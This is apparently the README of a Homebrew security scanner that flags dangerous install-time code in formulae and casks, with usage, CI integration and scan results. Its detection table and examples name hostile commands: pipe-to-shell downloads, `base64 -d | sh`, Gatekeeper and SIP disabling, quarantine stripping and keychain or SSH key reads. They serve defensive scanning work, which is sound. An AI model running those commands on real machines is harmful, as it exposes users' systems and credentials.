# homebrew-audit

**Security-scan Homebrew formulae, casks and third-party taps before you install them.** Zero dependencies, one file, MIT. Also a tap: `brew secaudit`.

```bash
brew tap eltociear/audit
brew trust --command eltociear/audit/secaudit   # Homebrew 7+: allow just this command
brew secaudit                       # scan everything you have installed
brew secaudit some-owner/some-tap   # scan a whole third-party tap before tapping it
brew secaudit wget                  # a homebrew-core formula
brew secaudit --cask iterm2         # a homebrew-cask cask
```

```
🔴 Casks/e/evil.rb  [CRITICAL]  score=25  (1 findings, 2 info)
    CRITICAL Quarantine Stripping (line 7, hook)
             run "/usr/bin/xattr", args: ["-r", "-d", "com.apple.quarantine", "{{staged_path}}/Evil.app"]
```

## Why this exists

`brew audit` checks **style and conventions**. It doesn't check whether a formula or cask does
something dangerous when you install it. A formula is Ruby that runs on your machine, and a cask
can run `preflight`/`postflight` code, often through `sudo: true`. Every `brew tap` of a
third-party repository trusts all of that code.

homebrew-core and homebrew-cask are reviewed. Third-party taps are not. And
[the scan](FINDINGS.md) shows the most common dangerous pattern there doesn't look like malware:
**a third-party cask that silently strips `com.apple.quarantine`, so Gatekeeper never checks the app.**
The official cask repository does this zero times. Among the 31 most-starred third-party taps
that ship casks, **6 do it**. One of them does it in 631 of its 634 casks, so a single
`brew tap` there turns off Gatekeeper for everything you install from it.

| Pattern | Severity |
| --- | --- |
| Pipe-to-shell (`curl … \| sh`, `bash <(curl …)`) | CRITICAL |
| Quarantine stripping (`xattr -d com.apple.quarantine`, `xattr -cr`, `LSQuarantine`) | CRITICAL |
| Gatekeeper / SIP disable (`spctl --master-disable`, `csrutil disable`) | CRITICAL |
| Credential exfiltration (token / key / keychain → non-GitHub host) | CRITICAL |
| Decoded-then-executed payloads (`eval(Base64.decode64(…))`, `base64 -d \| sh`) | CRITICAL |
| Remote Ruby eval (`eval(URI.open(…).read)`) | CRITICAL |
| Sudoers / TCC.db / `authorized_keys` writes | CRITICAL |
| Credential & Keychain reads (`~/.ssh/id_*`, `~/.aws/credentials`, `security dump-keychain`) | HIGH |
| launchd persistence from an install hook | HIGH |
| Shell startup file tampering (`~/.zshrc`, `/etc/paths`) | HIGH |
| TLS bypass (`curl -k`, `VERIFY_NONE`) | HIGH |
| Unverified plaintext download (`http://` + `sha256 :no_check`) | HIGH |
| Setuid binaries | HIGH |
| Install-time network fetch (skips the checksum) · raw `sudo` · missing checksum · world-writable · obfuscation | MEDIUM |
| `http://` download that is still sha256-pinned | LOW |

That's 19 scored patterns (46 regex signatures, plus 4 file-level checks), plus 7 informational
ones. Deterministic, no LLM, no network needed to score.

## Ruby-aware, so it stays quiet

A regex scanner pointed at Homebrew Ruby flags 2.45% of the *official* repositories. That's a
false positive on hundreds of reviewed packages, and it gets the tool muted. The reasons are
structural:

- `test do` blocks are full of attack strings on purpose. A formula for a shell-security tool
  tests itself against `curl https://x.invalid/i.sh | sh`.
- `zap trash:` lists `~/.aws/…` and `~/Library/LaunchAgents/…` because it is **deleting** them.
- `uninstall launchctl:` *unloads* a daemon. It doesn't install one.
- `caveats` tell you to add a line to `~/.zshrc`. That's advice to the user, nothing is run.
- `desc "Utility to modify the macOS TCC.db"` is a description, not a write.

So every line is classified by the stanza it lives in (`def install`, `postflight`,
`postflight_steps`, `uninstall`, `zap`, `test do`, `livecheck`, `caveats`, metadata), with
indentation and heredoc tracking. A match only counts as risk in code that actually runs at
install time. Anything in `caveats` is capped at MEDIUM and labelled *advised to the user*.
Capabilities like `sha256 :no_check`, `sudo: true`, `pkg` installers and launchd references are
reported as `info` and never scored.

The result, over **16,593 official formulae and casks: 0 CRITICAL, 6 HIGH (0.04%)**. All 6 are
real weaknesses: `http://` downloads with `sha256 :no_check`, meaning nothing verifies the bytes.
Across all 12 canaries in `tests/`, every malicious pattern trips at the right severity.

**Full results: [FINDINGS.md](FINDINGS.md)**

## Usage

```bash
python3 homebrew_audit.py Formula/foo.rb Casks/bar.rb   # local files
python3 homebrew_audit.py path/to/tap-checkout/          # a directory (Formula/, Casks/, root *.rb)
python3 homebrew_audit.py --tap owner/homebrew-xxx       # whole tap, one tarball, no API quota
python3 homebrew_audit.py --tap owner/xxx                # "homebrew-" prefix is implied, like brew tap
python3 homebrew_audit.py --formula owner/tap/name       # one formula from a third-party tap
python3 homebrew_audit.py --formula wget                 # homebrew-core
python3 homebrew_audit.py --cask iterm2                  # homebrew-cask
python3 homebrew_audit.py --installed                    # Cellar/*/.brew/*.rb + Caskroom metadata
python3 homebrew_audit.py --json --tap owner/xxx         # machine-readable
python3 homebrew_audit.py --verbose …                    # also print info-tier context
python3 tests/run_tests.py                               # canary + benign regression suite
```

Exit code is `2` if any target is HIGH or CRITICAL, so it works as a CI gate. Put
`brew secaudit owner/tap` in front of `brew tap owner/tap` in a bootstrap script, or run it in a
tap's own CI.

`brew secaudit` is a [Homebrew external command](https://docs.brew.sh/External-Commands) shipped
by this tap (`cmd/brew-secaudit`). It runs the same single Python file with the system
`python3`. With no arguments it scans what's installed. Homebrew 7+ won't run commands from an untrusted tap, so
`brew trust --command eltociear/audit/secaudit` trusts this one command without trusting the
whole tap. Prefer not to trust anything? Run `python3 homebrew_audit.py` directly. It's one file.

## Caveats

- It's static. A cask whose `url` serves a malicious binary looks the same as one that serves a
  benign binary. This scans what the formula **does**, not what it downloads.
- Findings are pattern matches that need human review. "Quarantine stripped" means the
  maintainer chose to bypass Gatekeeper for you. It doesn't mean the app is malware.

Sibling projects: [mcp-audit](https://github.com/eltociear/mcp-audit) (MCP servers & agent
skills) · [skill-audit-mcp](https://github.com/eltociear/skill-audit-mcp) (the same idea as an
MCP server, GitHub Action and API).

MIT © Ikko Eltociear Ashimine

## Output formats and CI

These flags are shared by every scanner in the eltociear `*-audit` family and behave the same way in each.

| flag | effect |
|---|---|
| `--json` | machine-readable report in the family schema `eltociear-audit/1` (below) |
| `--sarif` | SARIF 2.1.0 on stdout, for GitHub code scanning (`github/codeql-action/upload-sarif`) and other SARIF viewers |
| `--fail-on {critical,high,medium,low,never}` | exit `2` when any target reaches that level. Default `high`, which is the original behaviour. `never` always exits `0` |
| `--version` | prints `homebrew-audit <version>` |

Exit codes: `0` means no target reached the `--fail-on` level, `2` means at least one did, and `1` is a usage error. If a target can't be fetched or parsed, it's reported with `error` set (in SARIF, as a `toolExecutionNotifications` entry with `executionSuccessful: false`). An error alone doesn't change the exit code, so check `errors` in `--json` if a failed fetch should fail your job.

`--json` schema (`eltociear-audit/1`, one shape for the whole family):

```
{
  "schema": "eltociear-audit/1",
  "tool": {"name": "homebrew-audit", "version": "x.y.z"},
  "fail_on": "high", "exit_code": 2, "max_severity": "CRITICAL", "errors": 0,
  "results": [{
    "target": "...", "risk_level": "CRITICAL|HIGH|MEDIUM|LOW|SAFE", "risk_score": 0-100,
    "error": null, "counts": {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
    "findings": [{"rule_id": "...", "severity": "CRITICAL", "name": "...", "description": "...",
                  "file": "path/in/target", "line": 12, "matched": "...", "context": "..."}],
    "info": [ same shape, severity "INFO": capability context that never raises the risk ],
    "...": "scanner-specific extra fields, unchanged from earlier versions"
  }]
}
```

`results` is always a list, even when there's only one target. Each finding also keeps the scanner's own keys, such as `id`. In SARIF, `CRITICAL` and `HIGH` map to `error`, `MEDIUM` to `warning` and `LOW` to `note`. Rules carry a `security-severity` (9.5 / 8.0 / 5.5 / 3.0), and INFO context isn't emitted. For local targets, `artifactLocation.uri` is relative to the working directory, so run the scanner from the repository root.

```yaml
- run: python3 homebrew_audit.py . --sarif --fail-on never > homebrew-audit.sarif
- uses: github/codeql-action/upload-sarif@v3
  with: {sarif_file: homebrew-audit.sarif}
- run: python3 homebrew_audit.py . --fail-on high
```

Hostile input handling: archives are read in memory and never extracted to disk. Archive members whose names are traversal (`../`), absolute or drive-letter paths, or contain NUL are skipped. Symlink, hardlink, device and FIFO members are ignored. Each archive has a budget of decompressed bytes and members (bomb protection). Local directory walks only open regular files, so symlinks (including loops and links out of the tree), FIFOs and devices are never followed or read.
